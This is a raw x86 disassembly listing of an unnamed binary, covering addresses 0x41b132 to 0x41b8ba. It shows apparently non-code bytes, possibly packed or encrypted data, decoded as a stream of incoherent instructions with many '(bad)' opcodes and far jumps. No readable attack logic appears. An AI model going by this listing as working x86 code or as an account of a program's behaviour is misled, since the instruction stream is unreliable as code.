  41b132:	lds    edx,FWORD PTR [eax]
  41b134:	jl     0x41b159
  41b136:	xlat   BYTE PTR ds:[ebx]
  41b137:	cdq    
  41b138:	mov    ecx,0x50570c87
  41b13d:	(bad)  
  41b13e:	loopne 0x41b0c6
  41b140:	stos   BYTE PTR es:[edi],al
  41b141:	addr16 loop 0x41b0fd
  41b144:	dec    ecx
  41b145:	pop    ebp
  41b146:	push   cs
  41b147:	fcom   QWORD PTR [esi]
  41b149:	ins    BYTE PTR es:[edi],dx
  41b14a:	xlat   BYTE PTR ds:[ebx]
  41b14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b14c:	std    
  41b14d:	mov    WORD PTR ds:0xcceaea83,?
  41b153:	lahf   
  41b154:	leave  
  41b155:	mov    bh,0xd1
  41b157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b159:	xchg   DWORD PTR [eax],esp
  41b15b:	(bad)  
  41b15c:	pop    esi
  41b15d:	mov    bl,0xc9
  41b15f:	bound  edx,QWORD PTR [ebp-0x9]
  41b162:	mov    eax,DWORD PTR [eax-0x242b85a3]
  41b168:	cdq    
  41b169:	les    ebp,FWORD PTR [edx]
  41b16b:	adc    DWORD PTR [esi-0x58a7a955],eax
  41b171:	sub    ecx,DWORD PTR [eax]
  41b173:	add    DWORD PTR [esi+ebx*4],0x49
  41b177:	aam    0x1c
  41b179:	fist   DWORD PTR [esi+0x4e58e829]
  41b17f:	(bad)  
  41b180:	fld    QWORD PTR ds:0x941cd52a
  41b186:	mov    WORD PTR [ebp+esi*4+0x21517437],?
  41b18d:	shl    DWORD PTR [ecx],1
  41b18f:	arpl   bx,di
  41b191:	push   esi
  41b192:	call   0x9bd06b77
  41b197:	shr    BYTE PTR [ecx-0x4d],0x9a
  41b19b:	fwait
  41b19c:	dec    ebp
  41b19d:	daa    
  41b19e:	or     DWORD PTR [edx-0x387abbeb],esp
  41b1a4:	pop    es
  41b1a5:	je     0x41b210
  41b1a7:	add    BYTE PTR [ebp-0x8],ah
  41b1aa:	sub    ebp,DWORD PTR [ecx+eax*8-0x72d77636]
  41b1b1:	cmp    al,0x19
  41b1b3:	or     esp,DWORD PTR [ecx-0x50]
  41b1b6:	dec    ebp
  41b1b7:	cmp    DWORD PTR [edx-0x9],esp
  41b1ba:	sti    
  41b1bb:	adc    eax,0x7075b97d
  41b1c0:	dec    esi
  41b1c1:	stos   DWORD PTR es:[edi],eax
  41b1c2:	out    dx,eax
  41b1c3:	sbb    dh,BYTE PTR [eax+0x60]
  41b1c6:	add    BYTE PTR [ecx-0x9cdcef2],0xae
  41b1cd:	mov    ah,0x4e
  41b1cf:	lods   eax,DWORD PTR ds:[esi]
  41b1d0:	xchg   esp,eax
  41b1d1:	ret    0x2015
  41b1d4:	daa    
  41b1d5:	fist   DWORD PTR ds:[edi+0x9]
  41b1d9:	push   eax
  41b1da:	cmp    ch,BYTE PTR [esi+edx*2]
  41b1dd:	dec    esp
  41b1de:	stos   DWORD PTR es:[di],eax
  41b1e0:	stos   BYTE PTR es:[edi],al
  41b1e1:	dec    esi
  41b1e2:	inc    edx
  41b1e3:	sub    eax,0x9d987eff
  41b1e8:	aaa    
  41b1e9:	in     eax,dx
  41b1ea:	mov    ecx,DWORD PTR [edx+0x5e]
  41b1ed:	xchg   edx,eax
  41b1ee:	xlat   BYTE PTR ds:[ebx]
  41b1ef:	push   0xaa1bb4dc
  41b1f4:	int    0xf1
  41b1f6:	lock ds mov edx,0x2bfffe5c
  41b1fd:	jle    0x41b183
  41b1ff:	lods   al,BYTE PTR ds:[esi]
  41b200:	(bad)  
  41b201:	xor    edi,ebp
  41b203:	and    al,0x1f
  41b205:	fimul  WORD PTR [edi]
  41b207:	push   eax
  41b208:	inc    ebx
  41b209:	enter  0xd3,0x8d
  41b20d:	sub    DWORD PTR [edx+0x477f9bb7],edx
  41b213:	ret    
  41b214:	pop    eax
  41b215:	pusha  
  41b216:	pop    ds
  41b217:	push   eax
  41b218:	scas   eax,DWORD PTR es:[edi]
  41b219:	pavgw  mm2,QWORD PTR [esi-0x2d]
  41b21d:	sub    DWORD PTR [eax+0x7b6573d9],0x5449301e
  41b227:	xor    edx,edi
  41b229:	arpl   WORD PTR [edx-0x56],bp
  41b22c:	xchg   BYTE PTR [ecx],bh
  41b22e:	push   ss
  41b22f:	enter  0x5bdc,0x38
  41b233:	xchg   edi,eax
  41b234:	cmc    
  41b235:	test   edx,0x1e3ef445
  41b23b:	xor    ah,dl
  41b23d:	jp     0x41b285
  41b23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b240:	test   DWORD PTR [ebx],ebx
  41b242:	pushf  
  41b243:	adc    BYTE PTR [esi-0x75aa4595],ah
  41b249:	cmp    BYTE PTR [ebx],dl
  41b24b:	xchg   esi,eax
  41b24c:	mov    edx,0x56180c27
  41b251:	outs   dx,DWORD PTR ds:[esi]
  41b252:	es xor eax,0x4c401dfe
  41b258:	popf   
  41b259:	adc    al,0x40
  41b25b:	outs   dx,BYTE PTR ds:[esi]
  41b25c:	dec    esp
  41b25d:	in     eax,0x27
  41b25f:	xor    ebp,DWORD PTR [ecx]
  41b261:	dec    edx
  41b262:	sub    dh,dl
  41b264:	cwde   
  41b265:	lods   al,BYTE PTR ds:[esi]
  41b266:	aas    
  41b267:	add    al,0x36
  41b269:	pop    esp
  41b26a:	push   edi
  41b26b:	sbb    eax,0x44ce468e
  41b270:	adc    bl,BYTE PTR [esi]
  41b272:	ror    DWORD PTR [eax+0x4f4fb7f1],cl
  41b278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b279:	enter  0x7250,0xef
  41b27d:	jmp    0x2fe7:0xb0001f13
  41b284:	push   edi
  41b285:	call   0x4160:0x740654e5
  41b28c:	sti    
  41b28d:	enter  0xd862,0xd5
  41b291:	add    ebp,ebp
  41b293:	jg     0x41b234
  41b295:	jle    0x41b29e
  41b297:	xchg   edi,eax
  41b298:	mov    ch,0x2
  41b29a:	icebp  
  41b29b:	xchg   edi,eax
  41b29c:	repz and ebp,DWORD PTR [ebx]
  41b29f:	loope  0x41b309
  41b2a1:	inc    ecx
  41b2a2:	push   ebp
  41b2a3:	in     eax,dx
  41b2a4:	dec    edx
  41b2a5:	in     al,0x55
  41b2a7:	mov    ebx,0xac8565d
  41b2ac:	test   DWORD PTR [edi+0x10],0xf701ddc6
  41b2b3:	jo     0x41b330
  41b2b5:	jno    0x41b25e
  41b2b7:	fistp  WORD PTR [edi-0x1d]
  41b2ba:	jmp    0x41b2ac
  41b2bc:	xchg   esi,eax
  41b2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2be:	popf   
  41b2bf:	sub    ah,al
  41b2c1:	inc    edx
  41b2c2:	fild   DWORD PTR [ecx+0x3fb9137c]
  41b2c8:	push   edx
  41b2c9:	aas    
  41b2ca:	jnp    0x41b2b0
  41b2cc:	push   esi
  41b2cd:	add    edx,DWORD PTR [eax]
  41b2cf:	fdivp  st(5),st
  41b2d1:	jbe    0x41b2e4
  41b2d3:	stos   BYTE PTR es:[edi],al
  41b2d4:	and    ebp,DWORD PTR [ecx-0x38d63d99]
  41b2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2db:	inc    ebx
  41b2dc:	xor    BYTE PTR [ebx+0x70cc6228],dl
  41b2e2:	jmp    0x349e:0x35a26052
  41b2e9:	out    dx,eax
  41b2ea:	push   esi
  41b2eb:	or     eax,0x4df2f8b5
  41b2f0:	jo     0x41b320
  41b2f2:	in     al,0x5e
  41b2f4:	sub    eax,0xc2d14da5
  41b2f9:	retf   
  41b2fa:	clc    
  41b2fb:	retf   
  41b2fc:	sbb    al,BYTE PTR [ebx]
  41b2fe:	add    eax,0xef1191f
  41b303:	stc    
  41b304:	(bad)  
  41b305:	mov    esi,0xa14339b
  41b30a:	pop    edi
  41b30b:	cmp    eax,DWORD PTR [eax+eax*8]
  41b30e:	int3   
  41b30f:	scas   eax,DWORD PTR es:[edi]
  41b310:	(bad)  
  41b311:	shl    BYTE PTR [ebx-0x71aa24ac],cl
  41b317:	outs   dx,DWORD PTR ds:[esi]
  41b318:	mov    esi,0xe48a15e0
  41b31d:	xchg   ebx,eax
  41b31e:	out    0xda,eax
  41b320:	mov    ebx,?
  41b322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b323:	cdq    
  41b324:	dec    ebp
  41b325:	or     ecx,ebx
  41b327:	jmp    FWORD PTR [esi-0x23ca1f54]
  41b32d:	cmp    al,0xf9
  41b32f:	cld    
  41b330:	or     BYTE PTR [esi-0x3d0589de],cl
  41b336:	out    0x18,eax
  41b338:	xor    eax,0x10df07c9
  41b33d:	stos   BYTE PTR es:[edi],al
  41b33e:	call   0x9bc0:0x9a94ecca
  41b345:	push   ecx
  41b346:	pop    ss
  41b347:	or     eax,0x574f8bfe
  41b34c:	cmp    esp,ebp
  41b34e:	bound  ebx,QWORD PTR [esp+eax*8+0x18320dd5]
  41b355:	pop    ebp
  41b356:	push   es
  41b357:	sub    ah,BYTE PTR [ebp+edi*4+0x105b8623]
  41b35e:	fidivr DWORD PTR [ecx-0x77ee925f]
  41b364:	xchg   edx,eax
  41b365:	mov    al,ds:0x57323cfa
  41b36a:	je     0x41b395
  41b36c:	stc    
  41b36d:	leave  
  41b36e:	ins    BYTE PTR es:[edi],dx
  41b36f:	push   ss
  41b370:	rcl    BYTE PTR [esi],0xee
  41b373:	ds addr16 add eax,0x54c33e9a
  41b37a:	(bad)
  41b37e:	add    DWORD PTR [ecx],esi
  41b380:	test   ecx,edi
  41b382:	push   cs
  41b383:	gs adc bh,cl
  41b386:	and    eax,0x1f5254ce
  41b38b:	retf   
  41b38c:	lea    ebp,[eax+0x2]
  41b38f:	(bad)  
  41b390:	xor    esi,DWORD PTR [esi-0x70097437]
  41b396:	and    DWORD PTR [ecx-0x30c2d4f4],ecx
  41b39c:	adc    eax,0x1b199cbc
  41b3a1:	push   esp
  41b3a2:	leave  
  41b3a3:	iret   
  41b3a4:	sbb    edx,DWORD PTR [ebx+ebx*4]
  41b3a7:	push   esp
  41b3a8:	ret    
  41b3a9:	test   BYTE PTR [edx-0x1b5ad00c],ch
  41b3af:	jae    0x41b3c5
  41b3b1:	mov    ds:0xe11d83,eax
  41b3b6:	xor    ebp,DWORD PTR [ebx-0x2052191e]
  41b3bc:	in     eax,0x1a
  41b3be:	xchg   DWORD PTR [edi],edi
  41b3c0:	cmp    ch,BYTE PTR [ecx-0x6b7610ac]
  41b3c6:	sub    DWORD PTR [ebp-0x465c8445],edi
  41b3cc:	xlat   BYTE PTR ds:[ebx]
  41b3cd:	mov    ds:0xd2bc1555,al
  41b3d2:	add    eax,0x408437d3
  41b3d7:	popf   
  41b3d8:	add    al,BYTE PTR [edi-0x44eb1b3b]
  41b3de:	retf   0x74fa
  41b3e1:	dec    ecx
  41b3e2:	jb     0x41b3cf
  41b3e4:	inc    ecx
  41b3e5:	push   ecx
  41b3e6:	inc    edi
  41b3e7:	inc    esi
  41b3e8:	ja     0x41b37b
  41b3ea:	sar    DWORD PTR [ecx+0x5393be69],1
  41b3f0:	mov    eax,0xf275e8bc
  41b3f5:	jae    0x41b386
  41b3f7:	pop    ecx
  41b3f8:	xchg   DWORD PTR [ebx],eax
  41b3fa:	mov    ch,0x6b
  41b3fc:	scas   eax,DWORD PTR es:[edi]
  41b3fd:	dec    edi
  41b3fe:	xchg   ecx,eax
  41b3ff:	test   edx,edx
  41b401:	rcl    BYTE PTR [ecx],cl
  41b403:	xchg   BYTE PTR [eax],cl
  41b405:	jg     0x41b475
  41b407:	mul    DWORD PTR [edx]
  41b409:	stos   BYTE PTR es:[edi],al
  41b40a:	(bad)  
  41b40b:	jne    0x41b448
  41b40d:	mov    eax,ds:0x469e195c
  41b412:	push   eax
  41b413:	inc    ecx
  41b414:	sub    eax,0xa1c0ca70
  41b419:	out    dx,eax
  41b41a:	pop    ebx
  41b41b:	shr    DWORD PTR [edi-0x326be07],cl
  41b421:	add    eax,0xca7b0c79
  41b426:	xor    dh,BYTE PTR [ebp-0x61]
  41b429:	mov    bl,0xbd
  41b42b:	add    BYTE PTR [edi],ch
  41b42d:	jo     0x41b3ce
  41b42f:	loope  0x41b3b4
  41b431:	and    bl,dh
  41b433:	pop    ecx
  41b434:	or     eax,edx
  41b436:	mov    ds:0x89aec164,eax
  41b43b:	retf   
  41b43c:	dec    esi
  41b43d:	xchg   esi,eax
  41b43e:	in     eax,0xb6
  41b440:	add    DWORD PTR [esi+0x2d],esp
  41b443:	cmp    BYTE PTR ds:0x2a42595,dl
  41b449:	enter  0x3883,0xdb
  41b44d:	out    0x5f,al
  41b44f:	jae    0x41b475
  41b451:	push   ss
  41b452:	imul   eax,eax,0x81ee862
  41b458:	push   ds
  41b459:	sub    eax,0xfee4569b
  41b45e:	sub    al,BYTE PTR [ebx-0x7c7e4c22]
  41b464:	mov    edx,0x13f0fda8
  41b469:	and    dh,BYTE PTR [ecx+0x17ca83ae]
  41b46f:	adc    ch,dl
  41b471:	or     BYTE PTR [edx+eax*8],ah
  41b474:	push   ss
  41b475:	pop    ss
  41b476:	es pop ss
  41b478:	sbb    bh,BYTE PTR [eax+0x44270b6f]
  41b47e:	pop    ss
  41b47f:	das    
  41b480:	cmp    dl,BYTE PTR ss:[esi]
  41b483:	xor    cl,BYTE PTR [esi-0x1b]
  41b486:	mov    eax,DWORD PTR [edi-0x3a]
  41b489:	pusha  
  41b48a:	mov    esp,0x88e0f52e
  41b48f:	fidivr WORD PTR [esi]
  41b491:	jg     0x41b512
  41b493:	pop    ds
  41b494:	inc    edx
  41b495:	push   edi
  41b496:	mov    ebp,0x1132f8d4
  41b49b:	mov    WORD PTR [esi+0x4c],cs
  41b49e:	xor    eax,esp
  41b4a0:	push   ds
  41b4a1:	xchg   DWORD PTR [eax+0x33],esi
  41b4a4:	aam    0xbf
  41b4a6:	or     BYTE PTR [ebx],0x96
  41b4a9:	in     al,0xfc
  41b4ab:	aaa    
  41b4ac:	sub    dl,0x1a
  41b4af:	sbb    al,0xc9
  41b4b1:	lock or cl,ah
  41b4b4:	dec    ebp
  41b4b5:	fs pop ebp
  41b4b7:	jmp    0x61f3:0x808c55f5
  41b4be:	cmp    bx,WORD PTR es:[edx]
  41b4c2:	jae    0x41b4f4
  41b4c4:	fstp   QWORD PTR [ebp+0x49]
  41b4c7:	imul   edx,ecx,0x79
  41b4ca:	(bad)  
  41b4cc:	call   0x6760:0x72bb7eca
  41b4d3:	int    0xb
  41b4d5:	xchg   ebp,eax
  41b4d6:	add    DWORD PTR [edi],esp
  41b4d8:	cwde   
  41b4d9:	adc    DWORD PTR [esi+0x23770b91],edi
  41b4df:	or     ecx,esi
  41b4e1:	cld    
  41b4e2:	ins    BYTE PTR es:[edi],dx
  41b4e3:	push   ebx
  41b4e4:	dec    esp
  41b4e5:	jle    0x41b501
  41b4e7:	mov    edx,0x90bc9c83
  41b4ec:	mov    ebp,DWORD PTR [edi]
  41b4ee:	dec    ebx
  41b4ef:	stos   BYTE PTR es:[edi],al
  41b4f0:	jl     0x41b52f
  41b4f2:	js     0x41b532
  41b4f4:	scas   al,BYTE PTR es:[edi]
  41b4f5:	adc    eax,esi
  41b4f7:	idiv   BYTE PTR [ebx+esi*8+0x4f]
  41b4fb:	xchg   BYTE PTR [eax+0x22],dh
  41b4fe:	pop    ebx
  41b4ff:	ja     0x41b484
  41b501:	stos   BYTE PTR es:[edi],al
  41b502:	addr16 cwde 
  41b504:	aaa    
  41b505:	push   edx
  41b506:	retf   0x3d5a
  41b509:	xlat   BYTE PTR ds:[ebx]
  41b50a:	mov    ebp,0x88ff0557
  41b50f:	or     DWORD PTR [esi+0x7f],ecx
  41b512:	aam    0xe
  41b514:	and    BYTE PTR [edi+0x390cd733],0x83
  41b51b:	or     cl,bh
  41b51d:	das    
  41b51e:	cmp    al,0xc7
  41b520:	iret   
  41b521:	popf   
  41b522:	xchg   esp,eax
  41b523:	inc    eax
  41b524:	iret   
  41b525:	stc    
  41b526:	stc    
  41b527:	or     DWORD PTR [ebp+0x2966ac7],edi
  41b52d:	fdivrp st(0),st
  41b52f:	fcomp  QWORD PTR ds:0xc15a3bed
  41b535:	pop    ebp
  41b536:	inc    ebx
  41b537:	jns    0x41b536
  41b539:	fwait
  41b53a:	dec    ecx
  41b53b:	xchg   DWORD PTR [ebx+0x2e7186cd],edx
  41b541:	(bad)  
  41b542:	lea    edx,[ebx+0x56f4f2bd]
  41b548:	add    DWORD PTR [esi-0x65a70ded],ebp
  41b54e:	icebp  
  41b54f:	(bad)  
  41b551:	xchg   bh,dl
  41b553:	int    0xc4
  41b555:	fist   DWORD PTR [eax+0x54dec91e]
  41b55b:	arpl   WORD PTR [ecx-0x56eba18b],cx
  41b561:	outs   dx,DWORD PTR ds:[esi]
  41b562:	mov    bl,0xb1
  41b564:	push   esi
  41b565:	cs stos DWORD PTR es:[edi],eax
  41b567:	pop    ebx
  41b568:	xchg   edx,eax
  41b569:	sbb    BYTE PTR [ebx-0x44],dl
  41b56c:	cli    
  41b56d:	and    eax,0x30a47eea
  41b572:	daa    
  41b573:	ret    0x3e6c
  41b576:	and    eax,ecx
  41b578:	mov    dl,0x18
  41b57a:	outs   dx,DWORD PTR ds:[esi]
  41b57b:	jg     0x41b5aa
  41b57d:	leave  
  41b57e:	stc    
  41b57f:	cmp    dh,al
  41b581:	lods   al,BYTE PTR ds:[esi]
  41b582:	lahf   
  41b583:	xor    BYTE PTR [eax+0x58840e6e],cl
  41b589:	push   esi
  41b58a:	jmp    0x41b540
  41b58c:	mov    ch,0xf1
  41b58e:	and    BYTE PTR [edx-0x1d81801f],al
  41b594:	mov    ebp,0x1c3ca627
  41b599:	dec    esp
  41b59a:	test   eax,0xcce79c2e
  41b59f:	mov    ebp,0x8e1bca1b
  41b5a4:	push   edx
  41b5a5:	out    dx,eax
  41b5a6:	xor    edi,DWORD PTR [eax-0x583a5e3]
  41b5ac:	mov    ds:0x28bccc8e,al
  41b5b1:	adc    BYTE PTR [ebx-0xe14d881],0x49
  41b5b8:	aaa    
  41b5b9:	outs   dx,BYTE PTR ds:[esi]
  41b5ba:	hlt    
  41b5bb:	pop    edx
  41b5bc:	mov    DWORD PTR [eax+0x2e],ecx
  41b5bf:	cmp    al,0xc1
  41b5c1:	or     dl,BYTE PTR [edx+0x39f8451a]
  41b5c7:	add    al,0x45
  41b5c9:	leave  
  41b5ca:	adc    DWORD PTR [ebx-0xa],edx
  41b5cd:	hlt    
  41b5ce:	fiadd  WORD PTR [edi+0x7f]
  41b5d1:	sub    al,0x13
  41b5d3:	in     eax,dx
  41b5d4:	sbb    BYTE PTR [eax-0x25],al
  41b5d7:	daa    
  41b5d8:	test   al,0x5f
  41b5da:	(bad)  
  41b5db:	dec    ebp
  41b5dc:	and    eax,0x79fe1894
  41b5e1:	in     al,dx
  41b5e2:	xor    BYTE PTR [eax-0x3d5aaa31],dl
  41b5e8:	mov    ecx,0xcc12fa42
  41b5ed:	fsubr  QWORD PTR [ebp+0x293fa954]
  41b5f3:	push   es
  41b5f4:	sbb    eax,0x72b5d4b2
  41b5f9:	mov    bl,dl
  41b5fb:	fild   QWORD PTR [esi+0x74]
  41b5fe:	sbb    dl,dl
  41b600:	lds    edi,FWORD PTR [ebp+0x5b40d05f]
  41b606:	inc    ecx
  41b607:	mov    es:0x914ce81b,eax
  41b60d:	pop    edx
  41b60e:	jl     0x41b60e
  41b610:	into   
  41b611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b612:	test   DWORD PTR [edi+0x59],edi
  41b615:	aaa    
  41b616:	(bad)  
  41b617:	xchg   edx,eax
  41b618:	mov    edi,0x8ca74520
  41b61d:	rol    BYTE PTR [ecx+0x268e5daf],0x9d
  41b624:	(bad)  
  41b625:	arpl   WORD PTR [ebp+0x52b3adc],ax
  41b62b:	mov    ds:0x245ee567,al
  41b630:	(bad)  
  41b631:	add    dl,ah
  41b633:	xchg   esi,eax
  41b634:	jmp    0x53128326
  41b639:	retf   0x73a8
  41b63c:	ror    BYTE PTR [esi-0x3a],0xfc
  41b640:	xchg   BYTE PTR [ebx+0xd],dl
  41b643:	cmp    DWORD PTR [ebx-0x52],edx
  41b646:	or     al,0xbd
  41b648:	daa    
  41b649:	fidivr DWORD PTR [edi]
  41b64b:	ja     0x41b69c
  41b64d:	sbb    ah,ch
  41b64f:	pop    edi
  41b650:	xchg   esp,eax
  41b651:	(bad)  
  41b652:	leave  
  41b653:	xchg   ebp,eax
  41b654:	not    BYTE PTR [ebx]
  41b656:	(bad)  
  41b657:	xchg   ebx,eax
  41b658:	fisub  WORD PTR [esi+0x407152c6]
  41b65e:	mov    cl,0x4b
  41b661:	sbb    al,BYTE PTR [ebp+0x14]
  41b664:	pop    esi
  41b665:	scas   al,BYTE PTR es:[edi]
  41b666:	out    dx,al
  41b667:	mov    ds:0xdc0699a,al
  41b66c:	mov    eax,ds:0xfef303b6
  41b671:	sub    DWORD PTR [ecx-0x53],ebp
  41b674:	adc    al,BYTE PTR [edi+0x7be2c0b8]
  41b67a:	xchg   ebp,eax
  41b67b:	mov    cs,WORD PTR [eax-0x49]
  41b67e:	mov    ch,0x83
  41b680:	fisubr WORD PTR [edi+0x76]
  41b683:	sbb    al,0xc7
  41b685:	and    al,0x3c
  41b687:	sbb    DWORD PTR [ecx-0x3e],0x40
  41b68b:	cdq    
  41b68c:	imul   edi,ebx,0xb
  41b68f:	daa    
  41b690:	xchg   esp,eax
  41b691:	jl     0x41b6ad
  41b693:	test   al,0xb1
  41b695:	mov    eax,ds:0x96faff05
  41b69a:	adc    ah,BYTE PTR [eax+0x32b8f0a0]
  41b6a0:	dec    ecx
  41b6a1:	add    al,0x49
  41b6a3:	mov    bh,0x5a
  41b6a5:	push   ds
  41b6a6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b6a8:	rcr    DWORD PTR [ebp+0xe],cl
  41b6ab:	leave  
  41b6ac:	fdivr  DWORD PTR [ebx-0x320c736a]
  41b6b2:	es jae 0x41b734
  41b6b5:	fisubr DWORD PTR [ecx]
  41b6b7:	ds loop 0x41b6ac
  41b6ba:	mov    esp,0xeb304484
  41b6bf:	(bad)  
  41b6c0:	push   0xb8f4beae
  41b6c5:	into   
  41b6c6:	cmp    eax,0xcb4ceb76
  41b6cb:	aaa    
  41b6cc:	shl    esp,cl
  41b6ce:	mov    ds:0xc501741f,al
  41b6d3:	sbb    ch,ah
  41b6d5:	jne    0x41b6d5
  41b6d7:	sbb    eax,0x59435964
  41b6dc:	ins    BYTE PTR es:[edi],dx
  41b6dd:	iret   
  41b6de:	call   0x3ddf71fb
  41b6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e4:	pop    edx
  41b6e5:	inc    ecx
  41b6e6:	mov    bl,BYTE PTR [esi+edi*4-0x3e]
  41b6ea:	popa   
  41b6eb:	jae    0x41b6ac
  41b6ed:	das    
  41b6ee:	sbb    DWORD PTR [ecx-0x3b],esi
  41b6f1:	or     BYTE PTR [edi-0x2af8040a],ah
  41b6f7:	daa    
  41b6f8:	cwde   
  41b6f9:	nop
  41b6fa:	lea    esi,[edx+0x7a]
  41b6fd:	cmp    ecx,DWORD PTR [esi+0x1f7e167b]
  41b703:	call   0x148f1af1
  41b708:	in     eax,dx
  41b709:	jmp    0x41b692
  41b70b:	stc    
  41b70c:	mov    es,WORD PTR [ebx-0x20]
  41b70f:	push   ebp
  41b710:	dec    ebp
  41b711:	stos   BYTE PTR es:[edi],al
  41b712:	add    bl,BYTE PTR [esi+ecx*4-0x41]
  41b716:	enter  0xd657,0x51
  41b71a:	and    al,0x70
  41b71c:	sbb    eax,0x45fc05d3
  41b721:	clc    
  41b722:	daa    
  41b723:	sbb    BYTE PTR [edi+0xe],ah
  41b726:	ins    DWORD PTR es:[edi],dx
  41b727:	fdivr  QWORD PTR [edi+0x3a]
  41b72a:	lock xor BYTE PTR [edx+0x79c55e45],0xa9
  41b732:	inc    eax
  41b733:	mov    ds:0xfa6c83b5,eax
  41b738:	popa   
  41b739:	mul    DWORD PTR [ebx]
  41b73b:	mov    edi,0xa904d292
  41b740:	mov    dl,0x52
  41b742:	sbb    dl,BYTE PTR [edi+eax*8+0x16ffc9ae]
  41b749:	(bad)  
  41b74a:	cdq    
  41b74b:	mov    al,ds:0xb83db58b
  41b750:	mov    ecx,0x3500987a
  41b755:	lahf   
  41b756:	call   0x9b07:0xa5308a96
  41b75d:	data16 shr BYTE PTR [eax],cl
  41b760:	sub    eax,edx
  41b762:	pop    eax
  41b763:	aaa    
  41b764:	xchg   ebx,eax
  41b765:	out    0x82,al
  41b767:	mov    edi,0xcf814317
  41b76c:	add    DWORD PTR [eax-0x1b5d1b71],edi
  41b772:	sbb    ebx,DWORD PTR [ebx-0x2b71ef8]
  41b778:	mov    eax,0x7782b814
  41b77d:	mov    edi,0x75aefbdb
  41b782:	icebp  
  41b783:	dec    ebx
  41b784:	and    BYTE PTR [esi],bh
  41b786:	out    dx,al
  41b787:	push   ebp
  41b788:	pop    ebx
  41b789:	ja     0x41b70c
  41b78b:	mov    ch,0x85
  41b78d:	xchg   ebp,eax
  41b78e:	push   cs
  41b78f:	xchg   edx,eax
  41b790:	cmc    
  41b791:	xchg   ebx,eax
  41b792:	jmp    0x4106:0x3a13d824
  41b799:	push   edi
  41b79a:	xchg   edi,eax
  41b79b:	rcr    BYTE PTR [ecx+eax*8+0x69],cl
  41b79f:	daa    
  41b7a0:	jge    0x41b7a4
  41b7a2:	jg     0x41b731
  41b7a4:	mov    ebp,DWORD PTR [edi-0x45632c7b]
  41b7aa:	add    edx,DWORD PTR [edx-0x7ece4392]
  41b7b0:	add    DWORD PTR [ecx-0x614a7fd8],edi
  41b7b6:	scas   eax,DWORD PTR es:[edi]
  41b7b7:	mov    eax,0x63a7e0db
  41b7bc:	jne    0x41b80c
  41b7be:	(bad)  [ecx-0x20]
  41b7c1:	cld    
  41b7c2:	in     al,0xe5
  41b7c4:	mov    dh,0x8
  41b7c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c7:	int    0x27
  41b7c9:	daa    
  41b7ca:	pop    esi
  41b7cb:	mov    dl,0x3b
  41b7cd:	sti    
  41b7ce:	enter  0x1801,0x30
  41b7d2:	or     BYTE PTR [ecx+0x2838f91b],dh
  41b7d8:	add    eax,0x51cebc41
  41b7dd:	(bad)  
  41b7de:	out    dx,al
  41b7df:	xchg   DWORD PTR [ebp-0x4c09363],eax
  41b7e5:	xlat   BYTE PTR ds:[ebx]
  41b7e6:	imul   ebx,DWORD PTR [ebp+0x17a7a7ee],0x79
  41b7ed:	xor    eax,0x2137a6e3
  41b7f2:	mov    ah,bl
  41b7f4:	popa   
  41b7f5:	xchg   edx,eax
  41b7f6:	in     eax,dx
  41b7f7:	sub    eax,0x513b07d4
  41b7fc:	dec    esp
  41b7fd:	push   0x32
  41b7ff:	fmul   QWORD PTR [esi+eiz*8-0x79]
  41b803:	imul   ebp,edx,0x5f8667c3
  41b809:	inc    ebp
  41b80a:	inc    edx
  41b80b:	mov    ch,0x26
  41b80d:	inc    eax
  41b80e:	xor    bh,BYTE PTR [edi]
  41b810:	dec    edx
  41b811:	adc    dh,BYTE PTR [ebx-0x7b]
  41b814:	jno    0x41b83b
  41b816:	mov    esi,0xf5ead0b6
  41b81b:	jnp    0x41b896
  41b81d:	sbb    eax,DWORD PTR [eax-0x75]
  41b820:	inc    ebp
  41b821:	das    
  41b822:	xchg   edx,eax
  41b823:	mov    ds:0xfa2058f3,eax
  41b828:	pop    ebx
  41b829:	push   ebx
  41b82a:	pop    ss
  41b82b:	test   eax,0xd658d495
  41b830:	push   esi
  41b831:	inc    edx
  41b832:	test   BYTE PTR [ebx*8+0x1733d34f],cl
  41b839:	push   es
  41b83a:	pusha  
  41b83b:	retf   0x93dd
  41b83e:	dec    esi
  41b83f:	(bad)  
  41b841:	lahf   
  41b842:	in     eax,0x6b
  41b844:	mov    BYTE PTR [eax+ebx*4],dl
  41b847:	add    DWORD PTR ds:0x24b05d9d,edi
  41b84d:	sti    
  41b84e:	inc    edi
  41b84f:	rcl    DWORD PTR [ebp-0x5fd2a941],0x44
  41b856:	cmp    al,0x13
  41b858:	jmp    0x97e9:0xef1ad957
  41b85f:	add    eax,0xa187496c
  41b864:	fst    DWORD PTR [edx+eiz*4+0x73658a9c]
  41b86b:	ds push ss
  41b86d:	daa    
  41b86e:	push   0xff4199c3
  41b873:	lods   eax,DWORD PTR ds:[esi]
  41b874:	add    eax,0xf36160bc
  41b879:	pop    es
  41b87a:	ror    bl,0x16
  41b87d:	and    edx,DWORD PTR [eax+0x2b6c2121]
  41b883:	add    eax,0xbfa536e3
  41b888:	(bad)  
  41b889:	std    
  41b88a:	mov    eax,0xa0fe2462
  41b88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b890:	ficomp DWORD PTR [edi+0x47690ebe]
  41b896:	mov    eax,0x46a9af54
  41b89b:	pop    esp
  41b89c:	inc    esi
  41b89d:	pop    edi
  41b89e:	sbb    ecx,DWORD PTR ss:[edi]
  41b8a1:	in     al,dx
  41b8a2:	mov    al,ds:0x591c4159
  41b8a7:	sti    
  41b8a8:	mov    edx,0xfbdc8a57
  41b8ad:	xchg   ecx,eax
  41b8ae:	enter  0x1f08,0xd1
  41b8b2:	out    0x33,eax
  41b8b4:	jbe    0x41b8c9
  41b8b6:	sbb    ebx,DWORD PTR [ecx-0x5e]
  41b8b9:	push   ss
  41b8ba:	xor    al,0x3f
